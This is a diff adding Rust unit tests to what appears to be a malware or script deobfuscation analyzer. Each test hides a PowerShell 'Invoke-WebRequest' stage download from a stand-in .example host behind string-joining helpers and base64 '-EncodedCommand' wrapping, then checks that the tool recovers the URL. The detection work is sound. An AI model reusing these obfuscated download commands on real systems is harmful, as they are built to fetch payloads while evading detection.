@@ -23530,6 +23530,238 @@ Add '{}'"#,
     }
 
     #[test]
+    fn ps1_literal_concat_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let url = "https://ps-concat-extractor.example/stage.ps1";
+        let inner = r#"function Join-Text($left,$right) {
+  return $left + $right
+}
+Join-Text 'Invoke-WebRequest -Uri https://ps-concat-extractor' '.example/stage.ps1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| { matches!(t, Trait::Download { src, .. } if src == url) }),
+            "literal concatenator extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_multi_concat_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let url = "https://ps-multi-concat-extractor.example/stage.ps1";
+        let inner = r#"function Join-Text($left,$middle,$right) {
+  return $left + $middle + $right
+}
+Join-Text 'Invoke-WebRequest -Uri https://ps-multi' '-concat-extractor' '.example/stage.ps1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| { matches!(t, Trait::Download { src, .. } if src == url) }),
+            "multi-part literal concatenator extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_string_concat_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let url = "https://ps-string-concat-extractor.example/stage.ps1";
+        let inner = r#"function Join-Text($left,$middle,$right) {
+  return [string]::Concat($left,$middle,$right)
+}
+Join-Text 'Invoke-WebRequest -Uri https://ps-string' '-concat-extractor' '.example/stage.ps1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| { matches!(t, Trait::Download { src, .. } if src == url) }),
+            "literal [string]::Concat extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_string_concat_array_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let url = "https://ps-string-concat-array-extractor.example/stage.ps1";
+        let inner = r#"function Join-Text($left,$middle,$right) {
+  return [string]::Concat(@($left,$middle,$right))
+}
+Join-Text 'Invoke-WebRequest -Uri https://ps-string' '-concat-array-extractor' '.example/stage.ps1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| { matches!(t, Trait::Download { src, .. } if src == url) }),
+            "literal [string]::Concat array extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_string_join_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let url = "https://ps-string-join-extractor.example/stage.ps1";
+        let inner = r#"function Join-Text($left,$middle,$right) {
+  return [string]::Join('', @($left,$middle,$right))
+}
+Join-Text 'Invoke-WebRequest -Uri https://ps-string' '-join-extractor' '.example/stage.ps1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| { matches!(t, Trait::Download { src, .. } if src == url) }),
+            "literal [string]::Join extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_format_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let url = "https://ps-format-extractor.example/stage.ps1";
+        let inner = r#"function Format-Text($left,$middle,$right) {
+  return '{0}{1}{2}' -f $left,$middle,$right
+}
+Format-Text 'Invoke-WebRequest -Uri https://ps-format' '-extractor' '.example/stage.ps1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| { matches!(t, Trait::Download { src, .. } if src == url) }),
+            "literal format extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_string_format_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let url = "https://ps-string-format-extractor.example/stage.ps1";
+        let inner = r#"function Format-Text($left,$middle,$right) {
+  return [string]::Format('{0}{1}{2}', $left,$middle,$right)
+}
+Format-Text 'Invoke-WebRequest -Uri https://ps-string' '-format-extractor' '.example/stage.ps1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| { matches!(t, Trait::Download { src, .. } if src == url) }),
+            "literal [string]::Format extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_array_format_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let url = "https://ps-array-format-extractor.example/stage.ps1";
+        let inner = r#"function Format-Text($left,$middle,$right) {
+  return '{0}{1}{2}' -f @($left,$middle,$right)
+}
+Format-Text 'Invoke-WebRequest -Uri https://ps-array' '-format-extractor' '.example/stage.ps1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| { matches!(t, Trait::Download { src, .. } if src == url) }),
+            "literal array format extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_ireplace_literal_resolves_url() {
         let inner =
             r#"Invoke-WebRequest -Uri ('hxxps://ps-ireplace.example/stage' -ireplace 'xx','tt')"#;
